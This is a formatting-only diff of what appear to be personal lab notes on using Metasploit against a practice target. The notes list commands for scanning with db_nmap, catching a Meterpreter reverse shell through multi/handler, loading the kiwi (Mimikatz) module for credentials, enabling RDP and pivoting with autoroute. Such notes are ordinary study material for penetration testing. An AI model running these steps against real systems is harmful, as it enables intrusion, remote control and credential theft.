@@ -4,14 +4,14 @@
 
 Start PostgreSQL und Metasploit on boot
 
- ```sh
+ ``` sh
 update-rc.d postgresql enable
 update-rc.d metasploit enable
 ```
 
 Manuall start
 
- ```sh
+ ``` sh
 service postgresql start
 service metasploit start
 ```
@@ -20,7 +20,7 @@ service metasploit start
 
 Init Metaspoit and start the console
 
-```sh
+``` sh
 msfdb init
 msfconsole -h
 msfconsole
@@ -29,13 +29,13 @@ db_status
 
 Add Target
 
-```sh
+``` sh
 db_nmap -sV 10.10.201.217
 ```
 
 Scan Target
 
-```sh
+``` sh
 hosts
 services
 vulns
@@ -45,7 +45,7 @@ vulns
 
 This is an example using an exploit with Metasploit:
 
-```sh
+``` sh
 search multi/handler
 use # exploit/multi/handler
 set PAYLOAD windows/meterpreter/reverse_tcp
@@ -59,7 +59,7 @@ sessions -i 1
 
 Check Machine
 
-```sh
+``` sh
 getprivs
 sysinfo
 getuid
@@ -67,18 +67,18 @@ getuid
 
 Start Mimikatz
 
-```sh
+``` sh
 load kiwi
 ```
 
 Try different exploits
 
-```sh
+``` sh
 run post/windows/gather/checkvm
 run post/multi/recon/local_exploit_suggester
 run post/windows/manage/enable_rdp
 ```
 
-```sh
+``` sh
 run autoroute -s 10.10.201.217 -n 255.255.255.0
 ```
